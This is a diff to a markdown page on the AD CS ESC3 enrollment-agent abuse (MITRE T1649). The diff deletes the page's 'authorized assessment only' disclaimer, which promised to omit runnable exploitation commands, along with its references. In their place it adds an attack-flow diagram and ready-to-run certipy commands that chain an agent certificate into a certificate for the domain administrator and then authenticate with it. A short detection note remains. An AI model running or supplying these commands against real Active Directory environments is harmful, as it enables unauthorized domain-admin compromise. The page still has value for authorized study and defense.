@@ -10,21 +10,41 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC3 (enrollment-agent policy)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **Certificate template** with the **Certificate Request Agent EKU** and low-priv enrolment.
 
-## Detection
+### Concept (deep)
+The attacker obtains an **agent certificate**, then uses it to request a certificate **on behalf of** a privileged user. This is a **two-stage chain**: enrol agent → enrol on-behalf-of.
+
+### Attack flow (Mermaid)
+```mermaid
+flowchart TD
+    A[lowpriv] --> B[Enrol Agent Certificate]
+    B --> C[Request on-behalf-of Administrator]
+    C --> D[Certificate for Administrator]
+    D --> E[PKINIT → DA]
+```
+
+### Commands
+```bash
+# ── Step 1 — obtain agent certificate ───────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template AgentTemplate
+
+# ── Step 2 — request on behalf of administrator ──────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template User \
+  -on-behalf-of 'CORP\administrator' \
+  -pfx agent.pfx
+
+# ── Authenticate ─────────────────────────────────────────────────────
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
+```
+
+### Detection
 **4886** with **`RequesterName` ≠ `Subject`** (on-behalf-of) in the CA log. Restrict agent templates to enrolment agents.
 
 ---
-
-## References
-
-- [Microsoft: Certificate template concepts](https://learn.microsoft.com/windows-server/identity/ad-cs/certificate-template-concepts)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
